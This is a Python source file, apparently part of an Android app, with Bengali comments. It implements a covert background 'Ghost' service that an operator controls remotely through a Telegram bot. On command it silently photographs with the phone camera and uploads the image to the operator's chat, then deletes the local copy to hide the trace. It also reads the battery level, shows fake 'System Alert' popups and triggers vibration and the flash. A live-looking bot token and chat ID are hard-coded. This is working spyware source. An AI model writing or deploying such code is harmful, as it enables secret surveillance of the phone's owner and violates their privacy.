# service.py (The Invisible Ghost)
import time
import requests
import os
from plyer import battery, camera, notification, vibrator, flash

# --- কনফিগারেশন (তোর টোকেন আর সঠিক আইডি বসাবি) ---
TOKEN = '8290022165:AAG-o11yW7wOgXRille39fd_jXs_mxbz4lE'
CHAT_ID = '5602673575' # এখানে তোর সেই @userinfobot থেকে পাওয়া আইডি দে

def send_msg(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, data={'chat_id': CHAT_ID, 'text': text})
    except:
        pass

def send_photo(path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    try:
        with open(path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': f})
        os.remove(path) # ছবি পাঠানোর পর ফোন থেকে ডিলিট করে দেবে (সাবধানতা)
    except:
        pass

def background_worker():
    last_update_id = 0
    # সার্ভিস চালু হওয়ার সাথে সাথে তোকে মেসেজ দেবে
    send_msg("Ghost Service Started! 👻\nReady for commands.")
    
    while True:
        try:
            # Long Polling (Fast Reply-এর জন্য)
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=30"
            response = requests.get(url, timeout=35).json()
            
            if response.get("result"):
                for update in response["result"]:
                    last_update_id = update["update_id"]
                    if "message" in update:
                        msg = update["message"].get("text", "")
                        
                        # ১. হেল্প মেনু
                        if msg == "/start":
                            send_msg("Commands:\n/battery\n/photo\n/vibrate\n/flash\n/msg [text]")
                        
                        # ২. ব্যাটারি চেক
                        elif msg == "/battery":
                            level = battery.status['percentage']
                            send_msg(f"🔋 Battery Level: {level}%")
                        
                        # ৩. ছবি তোলা (সাইলেন্টলি)
                        elif msg == "/photo":
                            try:
                                camera.take_picture(filename="snap.jpg", on_complete=send_photo)
                                send_msg("📸 Capturing photo...")
                            except:
                                send_msg("❌ Camera Error!")

                        # ৪. পপ-আপ মেসেজ (তোর চাওয়া ফিচার)
                        elif msg.startswith("/msg"):
                            popup_text = msg.replace("/msg ", "")
                            notification.notify(title='System Alert', message=popup_text)
                            send_msg(f"✅ Popup sent: {popup_text}")

                        # ৫. ভাইব্রেশন (৫ সেকেন্ড)
                        elif msg == "/vibrate":
                            vibrator.vibrate(5)
                            send_msg("📳 Vibrating...")

                        # ৬. ফ্ল্যাশলাইট (৩ সেকেন্ড)
                        elif msg == "/flash":
                            try:
                                flash.on()
                                time.sleep(3)
                                flash.off()
                                send_msg("🔦 Flash Blinked!")
                            except:
                                send_msg("❌ Flashlight Error!")
                            
        except Exception:
            # নেটওয়ার্ক এরর হলে ৫ সেকেন্ড অপেক্ষা করে আবার চেষ্টা করবে
            time.sleep(5)

if __name__ == '__main__':
    background_worker()